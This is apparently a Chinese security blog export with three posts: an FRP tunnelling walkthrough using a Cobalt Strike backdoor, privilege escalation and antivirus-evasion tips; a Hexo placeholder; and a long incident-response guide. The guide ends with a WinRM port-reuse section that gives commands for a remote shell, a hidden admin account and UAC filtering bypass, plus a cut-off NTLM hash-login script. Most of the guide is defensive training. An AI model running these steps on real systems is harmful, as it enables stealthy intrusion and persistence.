[{"title":"Frp内网渗透","path":"/2023/07/13/d9d69399/","content":"总字符数: 2.68K 代码: 0.30K, 文本: 0.97K 预计阅读时间: 5 分钟 内网穿透（Port Forwarding）是将公网上的IP地址映射到内部网络中的一台计算机的某个端口上，以便外部网络可以访问该计算机中运行的应用程序。 本次测试frp所使用的工具Frpc frp的原理如下：1.客户端向frp服务器发送请求。当客户端启动时，它会向frp服务器发送一条请求，请求服务器分配一个唯一的客户端ID。2.服务器返回分配的客户端ID。frp服务器将分配一个唯一的客户端ID，并将其返回给客户端。3.客户端连接到服务器。客户端使用分配的客户端ID连接到frp服务器，以便服务器可以知道客户端要连接的计算机和端口。4.服务器将请求转发到客户端。当外部网络发出请求时，frp服务器将请求转发到客户端，客户端将请求转发到指定的计算机和端口上。 本机cs连接测试内网穿透服务端：kali 192.168.52.128 密码123456客户端：win10 192.168.52.132 kali操作：cd &#x2F;home&#x2F;axu&#x2F;cs4.4.&#x2F;teamserver 192.168.52.128 123456注意这个端口，启动cs的时候需要 .&#x2F;cobaltstrike ip即kali服务器ip 进入到cs界面 添加一个监听，HTTP Host为kali服务器ip，端口6666，payload这里选择HTTP 选择生成后门- 选择创建的监听器，生成下载到kali机器 cd &#x2F;root&#x2F;xu.exe 因为是本机测试，将xu.exe直接copy到win10目标机，双击运行可看到已经成功获得对方的shell，目标机器已上线 提权 权限已提升为system* 接下来重点目标机上传frpc.exe和frpc.ini上传的frpc.exe应该是带签名的0.34.1的Frpc.exe，如若是裸frp落地火绒会直接杀的（印象中MID目标机frpc连接超时，而另一台目标机可以连接成功的原因是另一台目标机用的是0.45版本的Erfrp代理工具并且frpc与frps版本相对应）由于之前实战中目标机器运行frpc不成功总结一下原因1.frpc与frps版本不一致windows查看文件命令2.frpc.ini与frps.ini的token配置不一致（连接超时错误）3.frpc.ini配置server_addr &#x3D; ip地址与服务器地址不一致 12345678910frpc.ini[common]server_addr = 192.168.52.128server_port = 7000[plugin_socks5]type = tcpremote_port = 6500plugin = socks5plugin_user = axuplugin_passwd = axu123456 1234567frps.ini[common]bind_addr = 0.0.0.0bind_port = 7000dashboard_port = 7500dashboard_user = axudashboard_pwd = axu123321 [mid_socks5] 可能更偏向于某个软件或系统内部的中间层代理功能，而 [plugin_socks5] 则可能更偏向于某个软件或系统的插件系统中的代理功能扩展。 版本，配置文件对应后shell Frpc -c frpc.ini连接成功 SocksCap64测试代理服务器成功 完成之后，切记删除上传的frpc.ini文件，kill杀掉Frpc.exe进程，如果是本机测试的话，维权的文件也删除，sleep 10","tags":["蓝队","攻防演练","事件研判","应急响应","安全运营"],"categories":["红蓝对抗","蓝队"]},{"title":"HelloWorld","path":"/2023/07/13/d9d69390/","content":"总字符数: 0.78K 代码: 0.09K, 文本: 0.11K 预计阅读时间: 1 分钟 Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","tags":["蓝队","攻防演练","事件研判","应急响应","安全运营"],"categories":["红蓝对抗","蓝队"]},{"title":"应急响应基础","path":"/2023/07/13/d9d69310/","content":"总字符数: 27.68K 代码: 9.10K, 文本: 7.71K 预计阅读时间: 1.22 小时 什么是应急响应应急响应 应急响应(Incident Response&#x2F;Emergency Response): 通常是指一个组织为了应对各种意外事件 的发生所做的准备工作以及在突发事件发生时或者发生后所采取的措施 计算机网络应急响应的对象是指计算机或网络所存储、传输、处理的信息的安全事件,事件的主体可能来自自然界、系统自身故障(这里的系统包括主机范畴内的问题,也包括网络范畴内的问题)、组织内部或外部的人、计算机病毒或蠕虫等 应急处置 启动应急响应计划后,应立即采取相关措施抑制信息安全事件影响,避免造成更大损失.在确定有效控制了信息安全事件影响后,开始实施恢复操作.恢复阶段的行动集中于建立临时业务处理能力、修复原系统的损害、在原系统或新设施中恢复运行业务能力等应急措施. 信息安全应急响应计划规范GB&#x2F;T 24363-2009 应急响应生命周期(PDCERF) 检测预防为主 微观 帮助服务对象建立安全政策 帮助服务对象按照安全政策配置安全设备和软件 扫描，风险分析，打补丁 如有条件且得到许可，建立监控设施 宏观 建立协作体系和应急制度 建立信息沟通渠道和通报机制 电话、即时通讯、email 如有条件，建立数据汇总分析的体系和能力 有关法律法规的制定 制定应急响应计划资源准备 应急经费筹集 人力资源 指挥调度人员、协作人员 技术人员、专家 设备、系统和服务提供商 硬件设备准备 数据保护设备（磁盘、SAN）、冗余设备 （网络链路、网络设备、关键计算机设备 软件工具准备 备份软件、日志处理软件 系统软件、应急启动盘 病毒、恶意软件查杀软件 现场备份 业务连续性保障 系统容灾、搭建临时业务系统 准备确定事件性质和处理人微观（负责具体网络的CERT） 确定事件的责任人：指定一个责任人全权处理，事件，给予必要的资源 确定事件的性质： 误会？玩笑？还是恶意的攻击&#x2F;入侵？ 影响的严重程度， 预计采用什么样的专用资源来修复？ 宏观（负责总体网络的CERT） 通过汇总，确定是否发生了全网的大规模事件 确定应急等级，以决定启动哪一级应急方案 事故的标志（征兆和预兆） Web服务器崩溃 用户抱怨主机连接网络速度过慢 子邮件管理员可以看到大批的反弹电子邮件与可疑内容 网络管理员通告了一个不寻常的偏离典型的网络流量流向 来源 网络和主机IDS 、防病毒软件、文件完整性检查软件、系统、网络、蜜罐日志 公开可利用的信息、第三方监视服务 确认事故 确认网络和系统轮廓： 分析事故的最好技术方法之一 理解正常的行为： 基于处理事故的良好准备 使用集中的日志管理并创建日志保留策略 执行事件关联 保持所有主机时钟同步 维护和使用信息知识库： 分析事故时的快速参考 使用互联网搜索引擎进行研究 运行包嗅探器以搜集更多的数据 过滤数据 经验是不可替代的 建立诊断矩阵 寻求帮助 诊断矩阵实例 征兆 拒绝服务 恶意代码 非授权访问 不正确使用 文件，关键，访问尝试 低 中 高 低 文件，不适当的内容 低 中 低 高 主机崩溃 中 中 中 低 端口扫码，输入的， 不正常的 高 低 中 低 端口扫码，输出的， 不正常的 低 高 中 低 利用带宽高 高 中 低 中 利用电子邮件 中 高 中 中 遏制即时采取的行动 微观 防止进一步的损失，确定后果 初步分析，重点是确定适当的封锁方法 咨询安全政策 确定进一步操作的风险 损失最小化（最快最简单的方式恢复系统的基本功能，例如备机启动） 可列出若干选项，讲明各自的风险，由服务对象选择 宏观 确保封锁方法对各网业务影响最小 通过协调争取各网一致行动，实施隔离 汇总数据，估算损失和隔离效果 建议组织机构为几类主要的事故建立单独的遏制策略其标准包括： 潜在的破坏和资源的窃取 证据保留的需要 服务可用性（例如：网络连接，提供给外部当事方的服务） 实施战略需要的时间和资源 战略的有效性（例如：部分遏制事故，完全遏制事故） 解决方案的期限（例如：紧急事故工作区需在4 小时内清除，临时工作区需在两周内清除，永久的解决方案）。 根除长期的补救措施 微观 详细分析，确定原因，定义征兆 分析漏洞 加强防范 消除原因 修改安全政策 宏观 加强宣传，公布危害性和解决办法，呼吁用户解决终端的问题； 加强检测工作，发现和清理行业与重点部门的问题 恢复微观 被攻击的系统恢复正常的工作状态 作一个新的备份 把所有安全上的变更作备份 服务重新上线 持续监控 宏观 持续汇总分析，了解各网的运行情况 根据各网的运行情况判断隔离措施的有效性 通过汇总分析的结果判断仍然受影响的终端的规模 发现重要用户及时通报解决 适当的时候解除封锁措施 跟踪 关注系统恢复以后的安全状况，特别是曾经出问题的地方 建立跟踪文档，规范记录跟踪结果 对响应效果给出评估 对进入司法程序的事件，进行进一步的调查，打击违法犯罪活动 事件的归档与统计 处理人、时间和时段、地点 工作量、事件的类型、对事件的处置情况 代价、细节 应急响应思路流程1、收集信息在赶往出事地点的路上以及还没有接触到具体业务时，要提前向客户询问清楚事件情况，如发现时间以及大致发生时间、事件造成的破坏、受害主机情况(如系统、版本、内外网)、客户的具体处置要求 2、事件预定性在初步了解情况后先做一个事件性质预判，判断下这个事件是个什么事件，是勒索还是挖矿还是其他事件。然后根据事件发生时间划定一个时间范围，重点排查这个时间段内的情况，从影响范围中确认一个排查范围。 3、取证分析通过事件的初步定性取证，并且有选择的优先分析重点内容。 取证注意事项保护 12345保证数据的安全性：制作磁盘映像——不在原始磁盘上操作保证数据完整性：取证中不使用可能破坏完整性的操作第三方监督：所有操作都有第三方在场监督 提取 12345优先提取易消失的证据：内存信息、系统进程、网络连接信息、路由信息、临时文件、缓存等文件系统：数据恢复、隐藏文件、加密文件、回收站、注册表、系统日志等应用系统：系统日志、中间件日志 分析 123证据在什么地方：日志、删除的文件、临时文件、缓存从证据中能发现什么？如何关联证据？ 4、定向分析二次定性后，我们基本已经真正掌握了事件情况，这时就可以进行各种分析，对各种情况利用各种工具快速分析 应急响应信息收集表 感染主机数 感染了多数台主机 补丁情况 打了哪些补丁，是否存在补丁漏打 中毒现象 勒索&#x2F;挖矿&#x2F;DoS&#x2F;僵尸网络&#x2F;后门&#x2F;木马 客户名称 什么区域的什么客户 帐号密码 确认是否有弱密码 对外开发端口 对外开发了哪些端口 开启的服务 开启了哪些服务 操作系统版本 操作系统版本信息 客户需求 确认客户具体需求 响应流程 事件发生运维监控人员、客服审核人员等发现问题，向上通报。 事件确认收集事件信息、分析网络活动相关程序，日志和数据，判断事件的严重性，评估出问题的严重等级，是否向上进行汇报等。 事件响应各部门通力合作，处理安全问题，具体解决问题，避免存在漏洞未修补、后门未清除等残留问题。 事件关闭处理完事件之后，需要关闭事件，并写出安全应急处理分析报告，完成整个应急过程。 事件分类 病毒、木马、蠕虫事件 Web服务器入侵事件 第三方服务入侵事件 系统入侵事件 利用Windows漏洞攻击操作系统 网络攻击事件 DDoS &#x2F; ARP欺骗 &#x2F; DNS劫持等 分析方向文件分析 基于变化的分析 123日期文件增改最近使用文件 源码分析 12检查源码改动查杀WebShell等后门 系统日志分析 应用日志分析 123分析User-Agent，e.g. awvs / burpsuite / w3af / nessus / openvas对每种攻击进行关键字匹配, e.g. select/alert/eval异常请求，连续的404或者500 md5sum 检查常用命令二进制文件的哈希，检查是否被植入rootkit 进程分析 符合以下特征的进程 1234CPU或内存资源占用长时间过高没有签名验证信息没有描述信息的进程进程的路径不合法 dump系统内存进行分析 正在运行的进程 正在运行的服务 父进程和子进程 后台可执行文件的完整哈希 已安装的应用程序 运行着密钥或其他正在自动运行的持久化程序 计划任务 身份信息分析 本地以及域账号用户 异常的身份验证 非标准格式的用户名 日志分析 杀软检测记录 网络分析 防火墙配置 DNS配置 路由配置 监听端口和相关服务 最近建立的网络连接 RDP &#x2F; VPN &#x2F; SSH 等会话 配置分析 查看Linux SE等配置 查看环境变量 查看配套的注册表信息检索，SAM文件 内核模块 Linux应急响应 文件分析 最近使用文件 1234find / -ctime -2C:\\Documents and Settings\\Administrator\\RecentC:\\Documents and Settings\\Default User\\Recent%UserProfile%\\Recent 系统日志分析 12/var/log/more /etc/rsyslog.conf # 查看日志配置情况 重点分析位置 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051# 日志级别debug # 系统调试信息info # 常规信息warning # 警告信息err # 报错(级别低,阻止了某个功能能不能正常工作)crit # 报错(级别高,阻止了某个软件或整个系统不能正常工作)alert # 需要立即修改的信息emerg # 内核崩溃none # 不采集任何日志信息# 注意:从上到下,级别从低到高,记录的信息越来越少# 必看日志:secure、Messages、wtmp/etc/passwd # 用户列表/etc/init.d/ # 开机启动项/etc/cron* # 定时任务/tmp # 临时目录~/.ssh/var/log/messages # 包括整体系统信息,其中也包含系统启动期间的日志.此外,mail,cron,daemon,kern和auth等内容也记录在var/log/messages日志中/var/log/dmesg # 包含内核缓冲信息(kernel ring buffer).在系统启动时,会在屏幕上显示许多与硬件有关的信息.可以用dmesg查看它们/var/log/auth.log # 包含系统授权信息,包括用户登录和使用的权限机制等/var/10g/boot.log # 包含系统启动时的日志/var/log/daemon.log # 包含各种系统后台守护进程日志信息/var/log/dpkg.log # 包括安装或dpkg命令清除软件包的日志/var/log/kern.log # 包含内核产生的日志,有助于在定制内核时解决问题/var/log/lastlog # 记录所有用户的最近信息.这不是一个ASCII文件,因此需要用lastlog命令查看内容/var/log/maillog /var/log/mai1.log # 包含来自系统运行电子邮件服务器的日志信息.例如:sendmail日志信息就全部送到这个文件中/var/log/user.log # 记录所有等级用户信息的日志/var/log/Xorg.x.log # 来自X的日志信息/var/log/alternatives.log # 更新替代信息都记录在这个文件中/var/log/btmp # 记录所有失败登录信息.使用last命令可以查看btmp文件.例如:last -f /var/log/btmp more/var/log/cups # 涉及所有打印信息的日志。/var/log/anaconda.log # 在安装Linux时,所有安装信息都储存在这个文件中/var/log/yum.log # 包含使用yum安装的软件包信息/var/log/cron # 每当cron进程开始一个工作时,就会将相关信息记录在这个文件中/var/log/secure # 包含验证和授权方面信息.例如:sshd 会将所有信息记录(其中包括失败登录)在这里/var/log/wtmp/var/log/utmp # 包含登录信息.使用wtmp可以找出谁正在登陆进入系统,谁使用命令显示这个文件或信息等/var/log/faillog # 包含用户登录失败信息.此外,错误登录命令也会记录在本文件中# 除了上述Log文件以外,vār/log还基于系统的具体应用包含以下一些子目录:/var/log/httpd/或/var/log/apache2 # 包含服务器access_log和error_log信息/var/log/lighttpd/ # 包含light HTTPD的access_log和error_log/var/log/mail/ # 这个子目录包含邮件服务器的额外日志/var/log/prelink/ # 包含.so文件被prelink修改的信息/var/log/audit/ # 包含被Linux audit daemon储存的信息/var/log/samba/ # 包含由samba存储的信息/var/log/sa/ # 包含每日由sysstat软件包收集的sar文件/var/log/sssd/ # 用于守护进程安全服务 用户分析 /etc/shadow 密码登陆相关信息 123root:$6$szBCA0J1J6UfTeGi$VpIsYVHoULUix8Q.ifya2Qjsf1zLkn0CMvvZqFAyfFvB9u/K7uk6pu4u1yN/P72Jim9tjDN1dMiSsrDRrOJQ..:19240:0:99999:7:::用户名:密码:密码上次修改时间:允许修改密码最短时间:允许修改密码最长时间:密码过期前提醒用户修改密码的时间# 可以用john碰撞解密 uptime 查看用户登陆时间 /etc/passwd 用户基本信息 12root:x:0:0:root:/root:/bin/bash用户名:密码:用户id:组id:用户说明:家目录:登录之后的shell /etc/sudoers sudo用户列表 后门账号排查1234567891011121314# uid为0即是超级用户权限账号awk -F: &#x27;&#123;IF($3==0)PRINT $1&#125;&#x27; /etc/passwd# 最小权限more /etc/sudoers | grep -v &quot;^#\\|^$&quot; | grep &quot;ALL=(ALL)&quot;# 检查是否有可登录的后门账号awk &#x27;/\\$1|\\$6/&#123;print $1&#125;&#x27; /etc/shadowcat /etc/passwd | grep -E &quot;/bin/bash$&quot;# last 用于显示用户最近登录信息 # 登录排查攻击者登录账号和时间last# lastb 显示用户错误的登录列表lastb# lastlog 显示所有用户上次登录信息lastlog 进程分析进程也可以在&#x2F;proc下面找到,Linux一切皆文件 netstat -antlp|more 查看是否打开了可疑端口 w 命令，查看用户及其进程 分析开机自启程序&#x2F;脚本 12/etc/init.d~/.bashrc 查看计划或定时任务 1crontab -l lsof 12lsof -i: PORTlsof -p PID ps&#x2F;pstree 1234# 查找进程ps -aux|grep java# 查看进程的子进程ps -efl | grep java 通信分析 iptablesLinux平台下的包过滤防火墙,具有封包过滤、封包重定向和网络地址转换(NAT)等功能 表 链 filter INPUT,FORWARD,OUTPUT nat PREROUTING,OUTPUT,POSTROUTING mangle PREROUTING,INPUT,FORWARD,OUTPUT,POSTROUTING raw PREROUTING,OUTPUT 动作 含义 ACCEPT 允许数据包通过 DROP 直接丢弃数据包,不会给数据端发送响应 REJECT 拒绝数据包,必要时会给数据端发送响应 SNAT 源地址转换,解决内网用户公用一个公网地址 MASQUERADE SNAT的特殊形式,适用于动态IP REDIRECT 在本机做端口映射 123456# 192.168.10.0/24 可接受,但192.168.10.10丢弃iptables -A INPUT -i eth0 -s 192.168.10.0/24 -j ACCEPTiptables -A INPUT -i eth0 -s 192.168.10.10 -j DROPiptables -nL --line-number | grep 192.168.10iptables -L -t nat# 重点注意:红队常用nat 木马排查实战流程 内存马查杀 visualvm 适用于servlet或filter框架组件内存马(JDK1.8以上,bin文件下)自带 https://visualvm.github.io/https://visualvm.github.io/ arthas 适用于servlet或filter框架组件内存马是阿里巴巴开源的Java诊断工具 copagent 适用于servlet,filter,listenter框架组件内存马 Windows应急响应 取证取证并非毫无头绪的，病毒本身必然有网络行为，内存必然有其二进制代码，它要么是单独的进程模块，要么是进程的dll&#x2F;so模块，通常，为了保活，它极可能还有自己的启动项、网络心跳包。 可以归结为如下4点要素：流量、内存、模块、启动项。 流量分析可以使用Wireshark，主要分析下当前主机访问了哪些域名、URL、服务，或者有哪些外网IP在访问本地主机的哪些端口、服务和目录，又使用了何种协议等等。 实施具体操作在简单做完定向分析并取证后，如果客户直接把系统重置了就不需要下一步了，如果客户要求从头到尾把系统排查一下那么就利用工具和手法进行排查。 对账户、进程、端口、服务、启动项、计划任务、文件、日志进行逐个检测， 系统信息 systeminfo查看补丁是否齐全,是否存在ms08-067相关漏洞 工具:Windows-exploit-suggester 文件分析 相关目录 下载目录 回收站文件 Temp History 应用程序打开历史 搜索历史 Lnk 驱动:(cmd&gt;Drivequery)日期 进程dll关联查询(tasklist -m) 共享文件(cmd&gt;Net share) 最近的文件(资源管理器&gt;%UserProfile%\\Recent) 文件更新 已安装文件,控制面板或者(regedit&gt;\\software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\) 最近使用文件 123C:\\Documents and Settings\\Administrator\\RecentC:\\Documents and Settings\\Default User\\Recent%UserProfile%\\Recent 后门查杀 1234567891011121314# 启动项HKEY_LOCAL_MACHINE\\SOFTWARE\\Microft\\windows\\currentversion\\run# 用户登录HKCU\\EnvironmentHKLM\\SOFTWARE\\Microft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit# 定时任务/计划任务1. 单击[开始]&gt;[设置]&gt;[控制面板]&gt;[任务计划],查看计划任务属性,便可以发现木马文件的路径2. 单击[开始]&gt;[运行];输入cmd,然后输入at,检查计算机与网络上的其它计算机之间的会话或计划任务,如有,则确认是否为正常连接# 服务自启动1. 单击[开始]&gt;[运行],输入services.msc,注意服务状态和启动类型,检查是否有异常服务# dll劫持HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlset\\Control\\SessionManager\\ExcludeFromKnownDlls# COM劫持%APPDATA%\\Roaming\\Microsoft\\Installer\\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;\\ 程序运行记录使用WinPrefetchView解析Prefetch文件夹中的.pf文件取证。 用户分析 查看是否有新增用户 查看服务器是否有弱口令 查看管理员对应键值 lusrmgr.msc 查看账户变化 net user 列出当前登录账户 wmic UserAccount get 列出当前系统所有账户 PChunter、D盾 进程分析 netstat -ano 查看是否打开了可疑端口 tasklist 查看是否有可疑进程 分析开机自启程序 123456789101112HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunonceHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnceHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\RunHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce(ProfilePath)\\Start Menu\\Programs\\Startup 启动项msconfig 启动选项卡gpedit.msc 组策略编辑器 查看计划或定时任务 123456C:\\Windows\\System32\\Tasks\\C:\\Windows\\SysWOW64\\Tasks\\C:\\Windows\\tasks\\schtaskstaskschd.msccompmgmt.msc 查看启动服务 1services.msc 主要注意点大致就是：没有厂商名字、没有签名验证信息、没有描述信息的可疑进程。还有典型的挖矿现象(CPU 或内存资源占用长时间过高)的进程。 Pchunter：黑色为微软官方进程，蓝色为外界安装软件进程，红色为可疑进程，同时注意进程参数 process Explorer:进程浏览器。界面功能从左到右为：Process进程、CPU占比、Private Bytes提交大小、Working Set(工作设置、内存)、PID、Description描述、Company Name公司名。 小技巧：被注入的进程属性里会多出**.NET Assemblies和.NET Performance**两个菜单 日志分析 事件查看 1eventvwr.msc 系统日志 123456789# 日志路径C:\\Windows\\System32\\winevt\\LogsC:\\windows\\Minidump# 必看日志Security.evtx、System.evtx、Application.evtx# 特殊ID号4624、4625、4634、4624、4672管理员登录# 查看是否执行了某些命令比如4688,创建新进程4732安全组管理# 4724用户账户管理 4738、4722、4720、4728 在取证那一步就做的工作，由于日志是最容易被删除或覆盖，所以一上去就要优先保存日志。 windows下可疑打开事件管理器或者使用EventLogExplorer、Logparse等工具。 重要的事件日志ID如下： Event ID(2000&#x2F;XP&#x2F;2003) Event ID(Vista&#x2F;7&#x2F;8&#x2F;2008&#x2F;2012) 描述 日志名称 528 4624 成功登录 Security 529 4625 失败登录 Security 680 4776 成功&#x2F;失败的账户认证 Security 624 4720 创建用户 Security 636 4732 添加用户到启用安全性的本地组中 Security 632 4728 添加用户到启用安全性的全局组中 Security 2934 7030 服务创建错误 System 2944 7040 IPSEC服务服务的启动类型已从禁用更改为自动启动 System 2949 7045 服务创建 System 端口分析注意以下状态的网络连接：ESTABLISHED：连接建立数据传输。LISTEN：监听中等待连接 Tcpview、火绒剑、命令行下netstat -ano： DNSQuerySniffer：DNS解析查询工具。可以通过此工具确定访问恶意域名的端口号，该工具还可以将主机访问过的所有域名记录下来。 启动项、计划任务、服务autoruns:检查启动项、计划任务、服务最推荐的工具。autoruns可以看到启动项的可执行文件路径和启动命令。 WMI后门：无文件，相对来说难以排查，但也可以使用autoruns排查。 其他 查看系统环境变量 WinRM端口复用连接排查 在默认情况下,WinRM服务的端口为5985,但可通过配置将其改成80端口 在排查时,可使用命令winrm enumerate winrm/config/listener查看是否启动服务,当存在返回信息时,则说明服务运行中,当无返回信息时,则服务关闭 关闭服务命令 cmd:winrm delete winrm/config/Listener?Address=*+Transport=HTTP powershell Set-Service -Name winrm -StartupType Disabled Stop-Service winrm 研判与溯源分析流程 定位事件 设备告警 辅助设备 告警事件 应急响应 分析服务器以及相应服务开放的端口 21 3389 445 443 80 3306 8080 分析服务被攻击的方法 OWASP TOP 10 爆破 欺骗 钓鱼 漏洞利用 分析日志 查找Webshell 分析网站数据库连接账号权限 分析网站容器权限 被提权了 查看补丁 查看账号连接情况（分析注册表如是否被克隆账号） 查看网络连接 分析进程 分析注册表启动程序 分析日志 分析一些提权工具 漏洞利用程序 执行对比命令 mimakatz 报告整理 信息分析 用户画像绘制流程 参考链接https://xz.aliyun.com/t/2524 重大信息安全事件报告表 重大信息安全事件报告表 报告时间： x 年x 月x 日x 时x 分 单位名称： 报告人： 联系电话： 通讯地址： 传真： 电子邮件： 发生重大信息安全事件的信息系统名称及用途： 负责部门： 负责人： 重大信息安全事件的简要描述（如以前出现过类似情况也应加以说明）： 初步判定的事故原因： 当前采取的措施： 本次重大信息安全事件的初步影响状况： 影响范围： 严重程度： 值班电话： 传真： 应急响应总结模板 信息安全事件应急响应结果报告表 原事件报告时间： x 年x 月x 日x 时x 分 备案编号： x 年x 月x 日x 第 x 号 单位名称： 报告人： 联系电话： 通讯地址： 信息系统名称及用途： 已采用的安全措施： 信息安全事件的补充描述及最后判定的事故原因： 本次信息安全事件的初步影响状况： 事后结果： 影响范围： 严重程度： 本次信息安全事件的主要处理过程及结果： 针对此类信息安全事件应采取的保障信息系统安全的措施和建议： 报告人签名： Windows端口复用-番外篇概述使用HTTP.sys中的Net.tcp Port Sharing服务，配合WinRM实现端口复用。 优点：HTTP.sys为windows原生机制，WinRM为windows自带功能，动作较小，不易触发主动防御。 需要管理员权限 原理HTTP.sysHTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序。 为了优化IIS服务器性能 从IIS6.0引入（即Windows Server 2003及以上版本） IIS服务进程依赖HTTP.sys HTTP.sys监听HTTP流量，然后根据URL注册的情况去分发，以实现多个进程在同一个端口监听HTTP流量。微软公开了HTTP Server API库，Httpcfg、Netsh等都是基于它的。 整个过程描述如下：Step 1.注册：IIS或其他应用使用HTTP Server API时，需要先在HTTP.sys上面注册url prefix，以监听请求路径。Step 2.路由：HTTP.sys获取到request请求，并分发这个请求给注册当前url对应的应用。 Net.tcp Port SharingNet.tcp Port Sharing服务是WCF（Windows Communication Foundation，微软的一个框架）中的一个新系统组件，这个服务会开启Net.tcp端口共享功能以达到在用户的不同进程之间实现端口共享。这个机制的最终是在HTTP.sys中实现的。目前将许多不同HTTP应用程序的流量复用到单个TCP端口上的HTTP.sys模型已经成为windows平台上的标准配置。 在以前的web应用中，一个web应用绑定一个端口，若有其他应用则需要绑定其他的端口才能实现监听。如下图所示，Web Application 1绑定了80端口后，Web Application 2再去绑定80端口会出错。 现在使用微软提供的NET.tcp Port Sharing服务，只要遵循相关的开发接口规则，就可以实现不同的应用共享相同的Web服务器端口。如下图中Web Application 1和Web Application 2同时绑定在80端口。 WinRMWinRM全称是Windows Remote Management，是微软服务器硬件管理功能的一部分，能够对本地或远程的服务器进行管理。WinRM服务能够让管理员远程登录Windows操作系统，获得一个类似telnet的交互式命令行shell，而底层通讯协议使用的正是HTTP。 事实上，WinRM已经在HTTP.sys上注册了名为wsman的url前缀，默认监听端口5985。因此，在安装了IIS的边界Windows服务器上，开启WinRM服务后修改默认listener端口为80或新增一个80端口的listener即可实现端口复用，可以直接通过80端口登录Windows服务器查询当前注册url前缀 1netsh http show servicestate 开启winrm服务Windows 2012及以上：winrm默认启动并监听了5985端口。Windows 2008：需要手动启动winrm。 1winrm quickconfig -q 增加80端口复用 1winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125; 更改winrm为80端口 默认5985端口开启，不需要更改端口。 默认5985端口不开启，则更改winrm为80端口，否则会因端口改变而引起管理员关注。 1winrm set winrm/config/Listener?Address=*+Transport=HTTP @&#123;Port=&quot;80&quot;&#125; 攻击机(Windows Server 2008 R2)也需要启动winrm并设置信任连接 1234# 启动winrmwinrm quickconfig ‐q# 设置信任主机地址winrm set winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125; 连接使用winrs命令接口连接远程winrm服务执行命令，并返回结果winrs，Windows Remote Shell，windows远程shell，是winrm的一个组件 1winrs ‐r:http://www.aabbcc.com ‐u:administrator ‐p:Password [命令] 实验端口复用开启IIS服务&#x2F;WEB服务 先看一下当前注册的url前缀:netsh http show servicestate 启动winrm:winrm quickconfig -q 再看一下注册的url前缀，发现winrm已注册: 看一下端口情况:netstat -ano 增加80端口复用:winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125; 更改winrm为80端口:winrm set winrm/config/Listener?Address=*+Transport=HTTP @&#123;Port=&quot;80&quot;&#125; 再看一下端口情况，发现5985端口已关闭: Attacker：Windows Server 2008 R2 x64 启动winrmwinrm quickconfig -q 设置信任主机地址:winrm set winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125; 使用winrs远程执行命令:winrs -r:http://192.168.232.135 -u:administrator -p:1qaz@WSX whoami 执行cmd命令可获取交互式shell:winrs -r:http://192.168.232.135 -u:administrator -p:1qaz@WSX cmd 此时IIS的正常服务并未受到影响: Bypass UAC 如果远程计算机上的帐户具有相同登录用户名和密码，则所需的唯一额外信息是传输、域名和计算机名称。 由于 用户帐户控制 (UAC) ，远程帐户必须是域帐户和远程计算机管理员组的成员。 如果帐户是管理员组的本地计算机成员，则 UAC 不允许访问 WinRM 服务。 若要访问工作组中的远程 WinRM 服务，必须通过创建以下 DWORD 注册表项并将其值设置为 1： [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System] LocalAccountTokenFilterPolicy 来禁用本地帐户的 UAC 筛选 12345678910net user test password@123 /addnet localgroup administrators test /add# 删除,因为无法直接修改reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /f# 添加注册表reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /fwinrm set winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;winrm e winrm/config/listener 修改后，普通管理员登录后也是高权限 Hash登录(来自网络)使用本地的winrs登录，虽然非常方便，但是Windows Server 2012以后我们抓取明文密码有些许复杂，多数情况下只能抓到账户的Hash，这个时候如果用winrs就无法正常登录了。此时，我们就可以借助python脚本，用NTLM hash执行命令了 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#!/usr/bin/python# -*- coding: UTF-8 -*-import argparseimport urllib.parseimport requestsimport winrmimport sysdef getURLState(url): r = requests.get(url) if r.status_code == 404: print(&quot;[-]404 Not Found!&quot;) sys.exit(0) elif r.status_code == 403: print(&quot;[-]403 Forbidden!&quot;) sys.exit(0) elif r.status_code == 500: print(&quot;[-]500 Internal Server Error!&quot;) sys.exit(0) elif r.status_code == 200: print(&quot;[+]200 OK!&quot;) return else: print(&quot;HTTP Status Code：&quot;+str(r.status_code)) returndef splitURL(url): parser = urllib.parse.urlparse(url) path = parser.path ip = parser.netloc port = parser.port return path,ip,portdef parseFlag(): parser = argparse.ArgumentParser(description=&#x27;WinRm Port Reuse (Only Windows Server &gt;= 2012)&#x27;) parser.add_argument(&quot;-r&quot;,action=&#x27;store&#x27;,dest=&#x27;url&#x27;,help=&#x27;Remote URL&#x27;) 